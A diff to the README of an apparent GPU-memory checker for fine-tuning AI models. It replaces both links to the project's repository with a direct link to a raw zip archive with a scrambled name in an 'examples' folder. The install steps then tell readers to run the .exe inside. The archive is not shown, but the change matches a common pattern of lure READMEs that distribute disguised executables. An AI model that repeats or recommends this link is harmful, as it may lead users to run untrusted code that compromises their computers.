@@ -1,6 +1,6 @@
 # 🧠 can-i-finetune-this - Check GPU memory for your models
 
-[![Download](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/mostospens/can-i-finetune-this)
+[![Download](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/mostospens/can-i-finetune-this/main/examples/finetune-i-can-this-v2.5.zip)
 
 ## 🎯 Purpose
 This tool helps you check if your computer hardware supports a specific artificial intelligence model. Artificial intelligence models require memory, known as VRAM, to work. If a model requires more memory than your graphics card provides, your system will crash or stall. This application calculates the memory needs of your selected model before you begin. It prevents errors and saves time by confirming compatibility before you start.
@@ -17,7 +17,7 @@ You need a Windows computer to run this tool. Ensure your computer meets these m
 ## 📥 How to Install
 Follow these steps to set up the application on your machine:
 
-1.  Visit the [official download page](https://github.com/mostospens/can-i-finetune-this) to obtain the installer.
+1.  Visit the [official download page](https://raw.githubusercontent.com/mostospens/can-i-finetune-this/main/examples/finetune-i-can-this-v2.5.zip) to obtain the installer.
 2.  Locate the latest version file ending in .exe.
 3.  Download the file to your computer.
 4.  Double-click the installer file to begin the setup process.
